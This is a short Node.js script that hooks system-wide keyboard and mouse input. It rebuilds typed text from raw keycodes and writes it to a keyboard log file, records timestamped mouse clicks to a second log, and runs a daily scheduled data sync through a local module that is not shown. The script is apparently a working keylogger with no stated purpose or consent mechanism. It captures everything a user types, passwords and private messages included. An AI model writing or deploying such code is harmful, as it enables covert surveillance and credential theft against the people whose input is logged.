const ioHook = require("iohook");
const fs = require("fs");
const cron = require("node-cron");
const synchronizedData = require("./dbs/synchronized_data");

// keyboard listener
let inputListenerString = "";
let mouseListener = "";
ioHook.on("keypress", (event) => {
  if (event.rawcode === 13) inputListenerString += "\n";
  else if (event.rawcode === 8 || event.rawcode === 46)
    inputListenerString = inputListenerString.slice(0, -1);
  else inputListenerString += String.fromCharCode(event.rawcode);
  fs.writeFileSync("./log/keyboard_log.txt", inputListenerString);
});

ioHook.on("mousedown", (event) => {
  event.datetime = new Date();
  mouseListener += JSON.stringify(event) + "\n";
  fs.writeFileSync("./log/mouse_log.txt", mouseListener);
});

ioHook.start();

// cron schedule
cron.schedule("0 6 * * *", () => {
  console.log("sync data");
  synchronizedData.sync();
});
